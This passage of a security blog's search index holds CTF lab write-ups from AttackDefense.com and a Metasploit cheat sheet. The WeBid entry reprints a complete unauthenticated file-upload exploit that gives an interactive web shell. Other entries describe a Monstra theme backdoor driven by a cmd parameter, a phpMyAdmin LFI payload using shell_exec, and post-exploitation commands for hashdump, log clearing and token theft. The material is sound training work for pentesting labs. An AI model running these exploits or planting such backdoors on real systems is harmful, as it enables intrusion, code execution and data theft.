attacker has administrative access to the web application and needs to find a remote code execution attack to run arbitrary commands on the server.Monstra CMS is a free and open source lightweight content management system written in PHP.Monstra CMS (3.0.4) is vulnerable to a Remote Code Execution documented in CVE-2018-9037.The following username and passwords may be used to explore the application and/or find a vulnerability which might require authenticated access: Username: admin Password: passwordLevel difficulty: IntermediateCategory: Webapps CVEs &gt; Remote Code ExecutionSolutionOn this lab, I got a basic installation of Monstra CMS (3.0.4) which is known to be affected by multiple vulnerabilities.The version of the application is mentioned on the admin panel login page.After researching on the internet for this specific vulnerability and all its features, I discovered this exploit: https://packetstormsecurity.com/files/145451/Monstra-CMS-3.0.4-Remote-Shell-Upload.htmlAs stated in the exploit, I logged in with the provided lab credentials: http://g6ekaqzapfe4sd8icc93mmyyw.public1.attackdefenselabs.com/monstra/admin/index.php?id=dashboardI accessed the file manager on the following page: http://g6ekaqzapfe4sd8icc93mmyyw.public1.attackdefenselabs.com/monstra/admin/index.php?id=filesmanager&amp;path=uploads/I have created and uploaded my backdoor according to the public exploit:When I tried to execute the uploaded backdoor I encountered the following issue: http://g6ekaqzapfe4sd8icc93mmyyw.public1.attackdefenselabs.com/monstra/public/uploads/backdoor.PHPThe current server does not recognize .PHP file extension as an .php executable file. Unfortunately, not all exploits work as expected or under multiple systems or server configurations. At this point I decided to take a look at the current theme: http://g6ekaqzapfe4sd8icc93mmyyw.public1.attackdefenselabs.com/monstra/admin/index.php?id=themesAs expected, the theme files can be edited and can execute custom PHP code, so I inserted my backdoor as such: http://g6ekaqzapfe4sd8icc93mmyyw.public1.attackdefenselabs.com/monstra/admin/index.php?id=themes&amp;action=edit_template&amp;filename=indexWherever theme files are executed, an attacker can send custom payloads in order to execute local system commands. For example: http://g6ekaqzapfe4sd8icc93mmyyw.public1.attackdefenselabs.com/monstra/home?cmd=ls http://g6ekaqzapfe4sd8icc93mmyyw.public1.attackdefenselabs.com/monstra/home?cmd=id http://g6ekaqzapfe4sd8icc93mmyyw.public1.attackdefenselabs.com/monstra/home?cmd=date" }, { "title": "AttackDefense.com [MSF] - Meterpreter Basics", "url": "/nitesculucian.github.io/2018/12/02/attackdefense-com-msf-meterpreter-basics/", "categories": "AttackDefense.com, writeups, offensive_security", "tags": "writeups, CTF, challange, AttackDefense.com, msf", "date": "2018-12-02 23:49:00 +0200", "snippet": "MissionThe target server as described below is running a vulnerable web server. You have to exploit the vulnerability and get a meterpreter session on the server. Then, you have to perform the fol...", "content": "MissionThe target server as described below is running a vulnerable web server. You have to exploit the vulnerability and get a meterpreter session on the server. Then, you have to perform the following tasks to complete the challenge!Tasks: Check the present working directory on remote (exploited) machine. List the files present in present working directory of the remote machine. Check the present working directory on local (attacker) machine. List the files present in present working directory of the local machine. Get the flag value present in /app/flag1 file. Change the flag value present in /app/flag1, so that no one else can get the right flag. Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory. Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag. Delete the .zip file from the directory. Print checksum of file mentioned in the extracted file (Refer to Q8). Check the PATH environment variable on the remote machine. There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file. Change to tools directory on the local machine. Upload a PHP webshell to app directory of the remote machine.Instructions: This lab is dedicated to you! No other users are on this network :) Once you start the lab, you will have access to a root terminal of a Kali instance Your Kali has an interface with IP address 192.X.Y.Z. Run “ip addr” to know the values of X and Y. The target server should be located at the IP address 192.X.Y.3. Do not attack the gateway located at IP address 192.X.Y.1 postgresql is not running by default so Metasploit may give you an error about this when startingLevel difficulty: EasyCategory: Metasploit &gt; MeterpreterSolutionOn this atypical lab I was provided with a Linux environment with root access and with two separated tasks: Obtain access with a meterpreter session to another host. Run multiple commands by following several tasks in order to retrieve flags and understand how Metasploit works.I started by understanding the current system network connections:I decided to target the 192.247.240.0/24 internal network as such:root@attackdefense:~# nmap -sP 192.247.240.2/24 -T4On this internal network, I discovered a particular 192.247.240.3 host on which I executed a nmap scan in order to retrieve all (-p-) open ports.root@attackdefense:~# nmap -A -p- -T4 192.247.240.3 -vStarting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 20:16 UTCNSE: Loaded 148 scripts for scanning.NSE: Script Pre-scanning.Initiating NSE at 20:16Completed NSE at 20:16, 0.00s elapsedInitiating NSE at 20:16Completed NSE at 20:16, 0.00s elapsedInitiating ARP Ping Scan at 20:16Scanning 192.247.240.3 [1 port]Completed ARP Ping Scan at 20:16, 0.03s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 20:16Completed Parallel DNS resolution of 1 host. at 20:16, 0.00s elapsedInitiating SYN Stealth Scan at 20:16Scanning g918q3ltrwh2wjm89rxhxkbbw.temp-network_a-247-240 (192.247.240.3) [65535 ports]Discovered open port 80/tcp on 192.247.240.3Discovered open port 3306/tcp on 192.247.240.3Completed SYN Stealth Scan at 20:16, 1.36s elapsed (65535 total ports)Initiating Service scan at 20:16Scanning 2 services on g918q3ltrwh2wjm89rxhxkbbw.temp-network_a-247-240 (192.247.240.3)Completed Service scan at 20:16, 6.03s elapsed (2 services on 1 host)Initiating OS detection (try #1) against g918q3ltrwh2wjm89rxhxkbbw.temp-network_a-247-240 (192.247.240.3)NSE: Script scanning 192.247.240.3.Initiating NSE at 20:16Completed NSE at 20:16, 0.13s elapsedInitiating NSE at 20:16Completed NSE at 20:16, 0.00s elapsedNmap scan report for g918q3ltrwh2wjm89rxhxkbbw.temp-network_a-247-240 (192.247.240.3)Host is up (0.000087s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.7 ((Ubuntu))| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set| http-git:| 192.247.240.3:80/.git/| Git repository found!| Repository description: Unnamed repository; edit this file 'description' to name the...| Remotes:|_ https://github.com/fermayo/hello-world-lamp.git| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: XODA3306/tcp open mysql MySQL 5.5.47-0ubuntu0.14.04.1| mysql-info:| Protocol: 10| Version: 5.5.47-0ubuntu0.14.04.1| Thread ID: 2| Capabilities flags: 63487| Some Capabilities: FoundRows, ConnectWithDatabase, LongColumnFlag, SupportsLoadDataLocal, SupportsCompression, ODBCClient, Support41Auth, SupportsTransactions, IgnoreSigpipes, LongPassword, Speaks41ProtocolOld, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, InteractiveClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins| Status: Autocommit| Salt: 5(eJ~^&gt;Wz#;&gt;c[~*Q&lt;uZ|_ Auth Plugin Name: 96MAC Address: 02:42:C0:F7:F0:03 (Unknown)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 2.178 days (since Fri Nov 30 16:00:30 2018)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=249 (Good luck!)IP ID Sequence Generation: All zerosTRACEROUTEHOP RTT ADDRESS1 0.09 ms g918q3ltrwh2wjm89rxhxkbbw.temp-network_a-247-240 (192.247.240.3)NSE: Script Post-scanning.Initiating NSE at 20:16Completed NSE at 20:16, 0.00s elapsedInitiating NSE at 20:16Completed NSE at 20:16, 0.00s elapsedRead data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)root@attackdefense:~#As we can see port 80 is open therefore I decided to run a basic Nikto scan:root@attackdefense:~# nikto -host 192.247.240.3:80- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.247.240.3+ Target Hostname: 192.247.240.3+ Target Port: 80+ Start Time: 2018-12-02 20:18:27 (GMT0)---------------------------------------------------------------------------+ Server: Apache/2.4.7 (Ubuntu)+ Cookie PHPSESSID created without the httponly flag+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.25+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ /phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;: Output from the phpinfo() function was found.+ /config.php: PHP Config file may contain database IDs and passwords.+ OSVDB-3268: /files/: Directory indexing found.+ OSVDB-3092: /files/: This might be interesting...+ /phpinfo.php: Output from the phpinfo() function was found.+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.+ Server leaks inodes via ETags, header found with file /README, fields: 0x21ff 0x5777f9f606580+ OSVDB-3092: /README: README file found.+ /phpinfo.php?GLOBALS[test]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;: Output from the phpinfo() function was found.+ /phpinfo.php?cx[]=kW0HSoJcVK2qfYhNEYfJTNRxrjdYTj219hbYksPNHDvkG5t161K44KyLCtXpBgCzbnqgGD2OT3o1kzFTJYANccJCkbSiUTXLD9FUgiBraw0ijPkAUpAD3yxUDexMFvxscEFaiAYr0wAhyHOEXJ9FjwIERj6oFFAXsnYqcMmJnvInvjXJfLs8jvSnFQoL2LBLX41CGWcLNuEHAk4gUS4Q8SQNDqWSdjBrslOIfM1q0HMyvt8KZkmBepEZGNvOlINnDWIqCSgIWQQheCr2vnhlbuLN7sDUhOQLTKWJvXuUeiqaM2nfFu6l9AZPsGHp1UHoOo0RjIAF9Z7JMeCv4llXsuxMPoRHNE1JFET0fzlu4oZ3QXBr9UJxQJI8leAMueYNrplviXV2fTLzyMeCxgtRKTSlLw9rOuSh0zJMyCS2fneQvV0sBGiNr11rnACMJv2vUd0CzoTVzonKJzkj0gYn3UxT5LKiFSuBb1kpZ5eX5hRIjlcZuUH8uyC6zSvdZxYxGMMx5EQdwU1moy9kuPKZjrX6XouJgmMpFaFSICZ8Mxmddmxh5p29k1WTmZPcLcMuOG0qfQVJrbBINH8aTE7JmVcSRU7cLKpBpLxNIlLtT02qsjRd3NWoAxI2wBPS5SNh3aTg0AvPKrCw0l9rlL0D8e6gPgHPrIN6snommUhr0ajmQffLlEn6aRHj7wCoZck3VsX6PbH4gN5tG13nDY7Bd4FUjdtzMyqUKNyQ7RwZOziA9UcAi6w7cLPyR9v9iWHwhmTyf5giOHE05qoB4pGrrqJuV1HzThus9Ny5HdgCgBx8JK306x1YsDmhCkA7waohV3uupAFN7W3htDoalt95TmWDIl2E6UAfTXNsclLP6taDAoz9nEutXuxJekDHgJrGz9Y02PrSPHOvAEkPZWoha5MUysUeP2TG21sVLXLExp5Ir9Ok7F6cI0hUwdcAzTdF64vLB0NB0Samt8RCGnXfP88cPyljIAs5mdBqexEDh7BBcYiGIRDxYZh9Ck1ZKij4XyXmCLtKAHcSClVAdJDO3YQcjzUVZWHbn0FqhS0UMAe6FxnavkFQoZgMw5x4n7J6QwV9rZO6kDjn7rHOkeoGGKCinVXA5clyK2YQCXhyE0EDtCPCgZ2OLgwYO2THtwnYJ7Z83L8YUoRKpYOK3ym0ohhAmQ6eyKnzMiJazXMdqZ9GeFNdbQwcLOI3N8Vo5kHZY4fkiviRfm90TzUJh9d69p6blG2e74qthCaKOGV4z53tYMR7YuNJ8STSKhArZWCERc77dvAz9bv0aZnIpVID0suPUzoI5NjGDjQss5FQFtCLSHsngQIgTyMvq7ysIvPcekh4LBPn7APudllor6ANV0SFtq5cYYSr8aoxh9dfXYZ49gu6ddEd4HlbV655Jr4kqg2TFbEzvw8l1AYobmBT9XUkA1MnoJ2DwBpJdW5yZfA3fZdQsvjgs5xvHIaR0XZ8yaKFBlbbQuC7mhVQOdSazMTfFuAd6W5SRcuBhXcyFhC5hWoh9JDdIKmQR4OuK8YlV7FmAmQZs9JNTw7cEFtOr2laRS6hsnjRzeMapHwCt7UfLSC6tQ1eII83GHJhl1oMEWXwBsuOlbCMohKc52djpb11j9Bk1ZKXNOwMTyA5URSnqy0c9DLeaQ2rsxcRI6Y4LfTiBGGUdmRepOwbXbQUGxY0tmB4mrj5VWVcPPFShOWwxq00r4Owo3UStj57HWCEhOtEwbmQWYkv0teEVOdvvC4PNYvliW4JuZrXT7QqC60AftCecKEOtzhioXlqQ8dYG47SMFFr4loXQDnYp91DREAjKEFp8jNp8s10pUAKZfg8iiGIkJBjzLCmIvy1qxUXF1LhW330KJmYuYkvqNyMtj6cQ2AurfS83QOwAkoPTfiEYxzDktdavTXrC5KPHBxH3e3dwwBRNp7bYZrPZSNV0KIe93pEJTfmvR767mPg3KhQfr4Ri9X9CmyHWeEkl7huZbShfDD64263BEEgwsJnuVqqVdHQNFQ0DTqZQ5J8nBFkhLqCY4fAR12EBnSNe8D1pQcQpUCy6hpB0xbHG7YL54OFymngSi2RAJRPSiF6csSw0TRqbzDw6XENZIIJt9CNJu2Kuo96SBjnuWBAmSCm4vTyHv0Ts8z7MqTrRkEQISpLcb4gqSc5LcMxTaRzzucVMOHk9Ip51pRQwq1fUjcFZCmnI5co1Hxhxy6Vtb9DOt7GxCcVPvmjE4LorIAG25X329mzikJ97pRNBzBmJVc88aWumiu6cvMcREq5dPibUrLV4CUIcFIS1rStsY8u0h4D57PIxSocic09jXmPYQtfiP5SFNdqb5muwUvZqMmTlfRYYcNkw3opVqH5ZTf0l8vhftvTNWODa8jXAp9IwBbTJVQW7BMnjlu2q6nQCXr4JCEhmn13tSmQQkAK4R7tQMqCC4J9f3NSPmSIkuSBmnQKls5B7j9sX3sU9Nj6WLuHLMsIBI97q5fatHtjQXtoH5TbbjhFsRe9hjEPbe34ZiFg8qPxAqDFBH7pJP0OYsvc9VebFckqtUeePOUtMzTDkFRElC6iOzSp08LoA8yvg77xYhYQT4NTiyhsQVVgME1DSXluMpCmWAi1Dhmpd4tXi0hjBhme7HsDTGRe8rA8k4NMzLbM5VKscUGa1J1O9fP2IrEvvRG2TpF1PYJJdXJHBTDPrzKZy14kdyO84zWjW3tGAU3QglBWvIWFhXz0bsW4QPMALBDG9WuVu8aFA4CK96y6C1VKMNGg7sDn8Vy0XWqpghv7eOihylXgXQkWZbOSYYG9m68fiyQxSO2w7aXFwmNByYlHod5u9OGvCOdE5h5sXztMsAq6aCoGLPXSNzOdtQqBDmQlbbWXKvijeJ1gXsqM4ugQx5XA9B1lFNA6X9M6giNZbAEiiczL6yC49RYQUsjvsiYsukvY22XOFXpdBKiNkk11QQb9itchQ2q1jhRR7SnPWD4PV2wgG0WXwsW9Ib4VikfgEjBMCJWBA6b22OFvZiw4yJtyA53JXbaiwt4knTCN8N2O9igVgX6q2leZh8u6LhYj0NwSpO2BSXdkYlcGJQ3kUicVhL2X5iBTsb2coC4aY54TxipSPKdtuxCQ20cigvpZ5xZfL1fKDKL8gnapUSiqS3ysUet3S2TSktcA5Mj0GlaLOSXaS733H2Zd4UJ1SbuCqoEMXzjV30oKcIPWwOxcWtNQiSnecjTE55Py8z92Sse3FXnGVtTeVQbcMKLkC1yQhAJUbft7m25EUAbxnUiXndW4UVilPRzzTOoVqY28fJTkVjVasjBqLmipTALwQ6EoQd5CsOwTblyCeBSMBOZYzwypwewCBkMFRf8lMcHKvAnvRFcAUVbb3Vb4FqJ2VXKQGZjv7H644sUiATrXir0dI1SD0WvGFvlF6vSyUB3NurSmTYZN0lhUhE3po9fxbYvVghfklPdHiYvRjBFRu00jEDaAvLAS5ObkWu9UEwpJESWrqXhgpx811xBj7QNn723OVkFyZR39UQ2W9wkJkknP7LjRIdMIB0WWubvfqJOLH4f2UWDgpPJjIN55E7lbLjbPYOhmHwXGYTWRV29rCs1H5PCRAe9FKfD5mn4TWQLxtuEAkVJa8FazMsWMJX3LrtGl5ySOehM1bFX4BjZ1mpp0qUZ0452c6iLJIrqZa76TcJhgIPb4OtkrMankzGqiF01XXyQe5cpnCp5SzGekRlOYOKfgkrTYTYsrvzGXyxbVQLcJ87CCkVMu2jroA8ACjMaTafPUicwxOnyn1py4ONS8TWHSYF8uNZ3ZY4LruZfiMiZjEzZ54kTCnib5k9L063KBm0H0xjBsZnmEOxOWRiiTFo1oPxiGYSR2s33b2R9PLqRfRi5L2ofE8fbbMmcUettLxTOLttkLGAIgo8gcacVca6lTE1x8of5gljduSNdh4CPjr8tw87ictHcqL66dlsFnOHnTlhZRvw1U6FZjtH3CiZCtgnf8rgbCqqeEwIrrRQcCY8sFHZdKUOfeJF1CISebdbgdPgk09rYoDJBXfcPr6d94Zw0mBqgOidLOO4PpWXlJaos2rs864DIwJKmbERKkTzRG6eCNJJQSLVbb&lt;script&gt;alert(foo)&lt;/script&gt;: Output from the phpinfo() function was found.+ OSVDB-3233: /icons/README: Apache default file found.+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.+ /.git/HEAD: Git HEAD file found. Full repo details may be present.+ /.git/config: Git config file found. Infos about repo details may be present.+ 8346 requests: 0 error(s) and 21 item(s) reported on remote host+ End Time: 2018-12-02 20:18:34 (GMT0) (7 seconds)---------------------------------------------------------------------------+ 1 host(s) testedroot@attackdefense:~#The Nikto scan did not return something interesting therefore I decided to move to a more advanced web scanner such as Arachni:root@attackdefense:~# arachni http://192.247.240.3:80The output:At this point I realized there might be a known vulnerable application called xoda so I asked msfconsole to see if there is a publicly known exploit:Using the exploit/unix/webapp/xoda_file_upload exploit in msfconsole command line interface:Configuring the exploit to match our target:Running the exploit against the target and obtaining the meterpreter session as a PHP web shell through an unrestricted file upload vulnerability:Let’s proceed with the meterpreter specific tasks: Check the present working directory on remote (exploited) machine. List the files present in present working directory of the remote machine. Check the present working directory on local (attacker) machine. List the files present in present working directory of the local machine. Get the flag value present in /app/flag1 file. Change the flag value present in /app/flag1, so that no one else can get the right flag. Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory. This flag is also trimmed: Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag. Delete the .zip file from the directory. Print checksum of file mentioned in the extracted file (Refer to Q8). Check the PATH environment variable on the remote machine. There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file. Change to tools directory on the local machine. Upload a PHP webshell to app directory of the remote machine.root@attackdefense:~# cp /usr/share/webshells/php/php-backdoor.php tools/The above-presented lab can be considered a good introduction on using meterpreter sessions and to ECCPT or OSCP like labs." }, { "title": "Metasploit Cheat Sheet", "url": "/nitesculucian.github.io/2018/12/02/metasploit-cheat-sheet/", "categories": "cheatsheet, offensive_security", "tags": "offensive security, cheat sheet, reverse shell, backdoor, bash, perl, python, PHP", "date": "2018-12-02 01:31:00 +0200", "snippet": "A few months ago I have created a msfvenom cheat sheet without explaining the Metasploit framework, so here it is a brief cheat sheet.Metasploit is a free tool that has built-in exploits which aids...", "content": "A few months ago I have created a msfvenom cheat sheet without explaining the Metasploit framework, so here it is a brief cheat sheet.Metasploit is a free tool that has built-in exploits which aids in gaining remote access to a system by exploiting a vulnerability in that server.General Information Command Description msfconsole Launch program version Display current version msfupdate Pull the weekly update makerc &lt;FILE.rc&gt; Saves recent commands to file msfconsole -r &lt;FILE.rc&gt; Loads a resource file Executing an Exploit / Scanner / Module Command Description use &lt;MODULE&gt; Set the exploit to use set payload &lt;PAYLOAD&gt; Set the payload show options Show all options set &lt;OPTION&gt; &lt;SETTING&gt; Set a setting exploit or run Execute the exploit Session Handling Command Description sessions -l List all sessions sessions -i &lt;ID&gt; Interact/attach to session background or ^Z Detach from session Using the DatabaseThe DB saves data found during exploitation. Auxiliary scan results, hashdumps, and credentials show up in the DB. First Time Setup (Run from linux command line.) Command Description service postgresql Start Start DB msfdb Init Init the DB Inside msfconsole Command Description db_status Should say connected hosts Show hosts in DB services Show ports in DB vulns Show all vulns found Meterpreter Session CommandsThe Meterpreter is a payload within the Metasploit Framework that provides control over an exploited target system, running as a DLL loaded inside of any process on a target machine. Command Description sysinfo Show system info ps Show running processes kill &lt;PID&gt; Terminate a process getuid Show your user ID upload / download Upload / download a file pwd / lpwd Print working directory (local / remote) cd / lcd Change directory (local / remote) cat Show contents of a file edit &lt;FILE&gt; Edit a file (vim) shell Drop into a shell on the target machine migrate &lt;PID&gt; Switch to another process hashdump Show all pw hashes (Windows only) idletime Display idle time of user screenshot Take a screenshot clearev Clear the logs Escalate Privileges Command Description use priv Load the script getsystem Elevate your privs getprivs Elevate your privs Token Stealing (Windows only) Command Description use incognito Load the script list_tokens -u Show all tokens impersonate_token DOMAIN\\USER Use token drop_token Stop using token Network Pivoting Command Description portfwd [ADD/DELETE] -L &lt;LHOST&gt; -l 3388 -r &lt;RHOST&gt; -p 3389 Enable port forwarding route add &lt;SUBNET&gt; &lt;MASK&gt; Pivot through a session by adding a route within msf route add 192.168.0.0/24 Pivot through a session by adding a route within msf route add 192.168.0.0/24 -d Deleting a route within msf Finding an Exploit / Payload to Use Command Description search &lt;TERM&gt; Searches all exploits, payloads, and auxiliary modules show exploits Show all exploits show payloads Show all payloads show auxiliary Show all auxiliary modules (like scanners) show all * My favorite Command Description use auxiliary/scanner/smb/smb_enumshares SMB Share Enumeration use auxiliary/scanner/smb/smb_ms17_010 MS17-010 SMB RCE Detection use exploit/windows/smb/ms17_010_eternalblue MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption use exploit/windows/smb/ms17_010_psexec MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution use exploit/windows/smb/ms08_067_netapi MS08-067 Microsoft Server Service Relative Path Stack Corruption use exploit/windows/smb/psexec Microsoft Windows Authenticated User Code Execution use exploit/multi/ssh/sshexec SSH User Code Execution (good for using meterpreter) use post/windows/gather/arp_scanner Windows Gather ARP Scanner use post/windows/gather/enum_applications Windows Gather Installed Application Enumeration run getgui -e Enables RDP for Windows in meterpreter session External Resources https://github.com/coreb1t/awesome-pentest-cheat-sheets/blob/master/docs/Metasploit-CheatSheet.pdf https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf " }, { "title": "AttackDefense.com [RCE] - WeBid", "url": "/nitesculucian.github.io/2018/12/01/attackdefense-com-rce-webid/", "categories": "AttackDefense.com, ctf, writeups, RCE", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-12-01 22:41:00 +0200", "snippet": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be compromised remotely. Remote Code Execution vulnerabiliti...", "content": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be compromised remotely. Remote Code Execution vulnerabilities could be triggered even by unauthenticated users.In the exercise below, the attacker is unauthenticated to the web application and needs to find a remote code injection attack to run arbitrary commands on the server.A version of WeBid is vulnerable to a remote code execution attack.Objective: Your task is to find and exploit this vulnerability.Level difficulty: EasyCategory: Real Web Applications &gt; Remote Code ExecutionSolutionWeBid provides open source auction software which has been used around the world and has been downloaded over 100,000 times and allows consumers to quickly set up their own auction site and get started straight away.Unfortunately, in this lab, I was provided with a rather old version of WeBid that has a Remote Code Execution Vulnerability using an unrestricted file upload.By going to the following link, I was able to retrieve the exact version of this PHP application: http://2e6goc7ffrfcmawrhu6u2r6n4.public2.attackdefenselabs.com/docs/changes.txtFunny enough this version of WeBid (1.1.1) is so broken, that the well known @GetSploitBot telegram bot cannot list all the exploits for all the existing vulnerabilities:I decided to use an Unrestricted File Upload Exploit in order to obtain a Remote Code Execution Vulnerability. Here is the example PHP exploit that I used in order to obtain an interactive web shell: https://vulners.com/zdt/1337DAY-ID-23323Here is an exact copy of the known PHP exploit:&lt;?php /* ,--^----------,--------,-----,-------^--, | ||||||||| `--------' | O .. CWH Underground Hacking Team .. `+---------------------------^----------| `\\_,-------, _________________________| / XXXXXX /`| / / XXXXXX / `\\ / / XXXXXX /\\______( / XXXXXX / / XXXXXX / (________( `------' Exploit Title : WeBid 1.1.1 Unrestricted File Upload Exploit Date : 20 February 2015 Exploit Author : CWH Underground Site : www.2600.in.th Vendor Homepage : http://www.webidsupport.com/ Software Link : http://sourceforge.net/projects/simpleauction/files/simpleauction/WeBid%20v1.1.1/WeBid-1.1.1.zip/download Version : 1.1.1 Tested on : Window and Linux #####################################################VULNERABILITY: Arbitrary File Upload Vulnerability##################################################### /ajax.php/inc/plupload/examples/upload.php #####################################################DESCRIPTION##################################################### This exploit a file upload vulnerability found in WeBid 1.1.1, and possibly prior. Attackers can abuse theupload feature in order to upload a malicious PHP file without authentication, which results in arbitrary remote code execution. #####################################################EXPLOIT##################################################### */ error_reporting(0);set_time_limit(0);ini_set(\"default_socket_timeout\", 5); function http_send($host, $packet){ if (!($sock = fsockopen($host, 80))) die(\"\\n[-] No response from {$host}:80\\n\"); fputs($sock, $packet); return stream_get_contents($sock);} print \"\\n+----------------------------------------+\";print \"\\n| WeBid Unrestricted File Upload Exploit |\";print \"\\n+----------------------------------------+\\n\"; if ($argc &lt; 3){ print \"\\nUsage......: php $argv[0] &lt;host&gt; &lt;path&gt;\\n\"; print \"\\nExample....: php $argv[0] localhost /\"; print \"\\nExample....: php $argv[0] localhost /WeBid/\\n\"; die();} $host = $argv[1];$path = $argv[2]; $payload = \"--o0oOo0o\\r\\n\";$payload .= \"Content-Disposition: form-data; name=\\\"name\\\"\\r\\n\\r\\n\";$payload .= \"shell.php\\r\\n\";$payload .= \"--o0oOo0o\\r\\n\";$payload .= \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"shell.php\\\"\\r\\n\";$payload .= \"Content-Type: application/octet-stream\\r\\n\\r\\n\";$payload .= \"&lt;?php error_reporting(0); print(___); passthru(base64_decode(\\$_SERVER[HTTP_CMD]));\\r\\n\";$payload .= \"--o0oOo0o--\\r\\n\"; $packet = \"POST {$path}ajax.php?do=uploadaucimages HTTP/1.1\\r\\n\";$packet .= \"Host: {$host}\\r\\n\";$packet .= \"Content-Length: \".strlen($payload).\"\\r\\n\";$packet .= \"Content-Type: multipart/form-data; boundary=o0oOo0o\\r\\n\";$packet .= \"Cookie: PHPSESSID=cwh\".\"\\r\\n\";$packet .= \"Connection: close\\r\\n\\r\\n{$payload}\"; print \"\\n\\nExploiting...\";sleep(2);print \"Waiting for shell...\\n\";sleep(2); http_send($host, $packet); $packet = \"GET {$path}uploaded/cwh/shell.php HTTP/1.1\\r\\n\";$packet .= \"Host: {$host}\\r\\n\";$packet .= \"Cmd: %s\\r\\n\";$packet .= \"Connection: close\\r\\n\\r\\n\"; print \"\\n ,--^----------,--------,-----,-------^--, \\n\"; print \" | ||||||||| `--------' | O \\n\"; print \" `+---------------------------^----------| \\n\"; print \" `\\_,-------, _________________________| \\n\"; print \" / XXXXXX /`| / \\n\"; print \" / XXXXXX / `\\ / \\n\"; print \" / XXXXXX /\\______( \\n\"; print \" / XXXXXX / \\n\"; print \" / XXXXXX / .. CWH Underground Hacking Team .. \\n\"; print \" (________( \\n\"; print \" `------' \\n\"; while(1){ print \"\\nWebid-shell# \"; if (($cmd = trim(fgets(STDIN))) == \"exit\") break; $response = http_send($host, sprintf($packet, base64_encode($cmd))); preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die(\"\\n[-] Exploit failed!\\n\");} ################################################################################################################# Greetz : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2################################################################################################################?&gt;# 0day.today [2018-02-10] #Example usage of the exploit on my localhost:Running the exploit against the given target and obtaining the interactive shell:Proof of remote code execution and final access:" }, { "title": "AttackDefense.com [LFI] - CVE-2018-12613 Exploit", "url": "/nitesculucian.github.io/2018/11/26/attackdefense-com-lfi-cve-2018-12613-exploit/", "categories": "AttackDefense.com, ctf, writeups, LFI", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-11-26 23:46:00 +0200", "snippet": "MissionAn attacker might get administrative access to a web application. However, this does not automatically mean that the web server can be compromised. In cases where a SaaS application is made ...", "content": "MissionAn attacker might get administrative access to a web application. However, this does not automatically mean that the web server can be compromised. In cases where a SaaS application is made available to users, it is routine to give each user admin access to his own instance of the web application e.g. a managed hosted Wordpress site. In such scenario, the attacker who will begin accessing the application as a managed administrative user will have to figure out how to exploit the administrative interface to get a shell on the server. In some cases, it might be possible to do privilege escalation as well.In the exercise below, the attacker has administrative access to the web application and needs to find a local file inclusion attack to get important files from the server.PHPMyAdmin is a free and open source web based administration tool for MySQL and MariaDB. It is developed in PHP and Javascript.PHPMyAdmin (4.8.1) is vulnerable to a Local File Inclusion documented in CVE-2018-12613.The following username and passwords may be used to explore the application and/or find a vulnerability which might require authenticated access: Username: pentester Password: password1Objective: Your task is to find and exploit this vulnerability.Level difficulty: IntermediateCategory: Webapps CVEs &gt; Local File InclusionSolutionAt first, I was provided with the PHPMyAdmin web application with a functional user account and password. PHPMyAdmin is a free and open source administration tool for MySQL and MariaDB. As a portable web application written primarily in PHP, it has become one of the most popular MySQL administration tools, especially for web hosting services. Using the provided credentials, I authenticated in the administrative panel of the application.After performing an research of the application version, I discovered the following public exploit description: https://www.exploit-db.com/exploits/44928One of the main functionality of PHPMyAdmin (4.8.1) is to execute SQL Queries. We can use the following form: http://byk4piiac0ltnaqgssdnhrjdr.public1.attackdefenselabs.com/server_sql.phpAccording to the exploit description, we can both create cache files of all commands executed within a session and also include those files in order to execute malicious code. Here is my example of the payload:select '&lt;?php $output = shell_exec(\"ls -al; date; id;\");echo \"&lt;pre&gt;$output&lt;/pre&gt;\";exit;?&gt;'We can include the cache file in order to execute our malicious code as such: 